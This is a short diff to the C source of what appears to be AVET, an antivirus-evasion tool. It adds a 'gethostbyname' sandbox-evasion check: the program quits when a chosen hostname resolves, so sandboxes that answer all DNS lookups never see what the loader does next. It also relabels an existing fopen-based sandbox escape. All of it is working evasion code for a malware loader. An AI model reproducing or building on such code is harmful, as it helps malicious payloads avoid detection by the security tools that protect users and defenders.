@@ -32,6 +32,9 @@ Web: https://github.com/govolution/avet
 #include <string.h>
 #include <windows.h>
 #include <tchar.h>
+#ifdef KVALUE
+	#include <winsock2.h>
+#endif
 #include "defs.h"
 
 int get_filesize(char *fvalue);
@@ -56,7 +59,7 @@ int main (int argc, char **argv)
 
 	opterr = 0;
 
-	// do evading here
+	// do evading here with fopen technique
 	#ifdef SANDBOX_FOPEN
 		#ifdef PRINT_DEBUG
 		printf("use fopen sandbox escape\n");
@@ -65,6 +68,17 @@ int main (int argc, char **argv)
 		if (fp == NULL)
 			return 0;
 		fclose(fp);
+	#endif
+
+	//evading with gethostbyname technique
+	#ifdef KVALUE
+		#ifdef PRINT_DEBUG
+		printf("use  gethostbyname sandbox evasion\n");
+		#endif
+		struct hostent *hp = gethostbyname(KVALUE);
+		if (hp != NULL) 		
+			exit(0);
+
 	#endif
 
 	#ifdef LVALUE
